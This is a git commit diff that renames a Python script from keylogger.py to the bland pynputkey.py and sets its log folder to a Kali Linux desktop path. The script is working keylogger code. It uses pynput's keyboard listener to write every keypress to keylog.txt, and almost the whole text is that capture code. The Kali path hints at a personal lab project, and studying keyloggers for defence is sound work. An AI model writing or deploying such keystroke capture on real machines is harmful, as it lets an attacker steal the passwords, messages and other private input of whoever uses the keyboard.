29fa8b7c49d0bfcc1f345eaab46d6c902819280b
SHADY <58383473+MasterMind-404@users.noreply.github.com>
2024-06-17 21:52:12 +0530

    Update pynputkey.py

--- pynputkey.py
+++ pynputkey.py
@@ -1,10 +1,17 @@
-# keylogger.py
+# pynputkey.py
 import pynput
 from pynput.keyboard import Key, Listener
 import logging
+import os
 
-log_dir = "/path/to/log/folder"
-logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+log_dir = "/home/kali/Desktop/log"
+log_file = "keylog.txt"
+
+# Create the log directory if it doesn't exist
+if not os.path.exists(log_dir):
+    os.makedirs(log_dir)
+
+logging.basicConfig(filename=os.path.join(log_dir, log_file), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_press(key):
     logging.info(str(key))
